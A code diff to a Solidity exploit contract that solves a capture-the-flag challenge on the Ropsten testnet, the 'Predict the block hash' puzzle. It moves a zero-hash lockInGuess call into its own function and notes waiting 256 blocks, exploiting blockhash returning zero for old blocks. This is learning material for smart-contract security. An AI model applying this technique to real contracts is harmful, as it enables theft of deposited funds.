@@ -7,7 +7,7 @@ interface IPredictTheBlockHashChallenge {
 }
 
 /**
- * TO PASS THIS CHALLENGE : WAIT until pass 256 block after caliing lockInGuess() ||  Mine 256 block by hardhat / tuffle the call attack()
+ * TO PASS THIS CHALLENGE : WAIT until pass 256 block exclude current block after caliing lockInGuess() ||  Mine 256 block by hardhat / tuffle the call attack()
  * https://ropsten.etherscan.io/ : to see a latest block number.
  */
 contract PredictTheBlockHashChallengeHack {
@@ -16,10 +16,9 @@ contract PredictTheBlockHashChallengeHack {
     uint256 public amountBlock;
     address public guesser;
 
-    constructor(IPredictTheBlockHashChallenge _ptfInstance) payable{
+    constructor(IPredictTheBlockHashChallenge _ptfInstance) {
         ptfInstance = _ptfInstance;
         startBlock = block.number;
-        ptfInstance.lockInGuess{value: msg.value}(0x0000000000000000000000000000000000000000000000000000000000000000);
     }
 
     function destroy() public payable{
@@ -28,6 +27,10 @@ contract PredictTheBlockHashChallengeHack {
 
     function mineBlock() public {
         amountBlock = block.number-startBlock;
+    }
+
+    function calllockInGuess() public payable {
+        ptfInstance.lockInGuess{value: msg.value}(0x0000000000000000000000000000000000000000000000000000000000000000);
     }
 
     function attack() public payable {
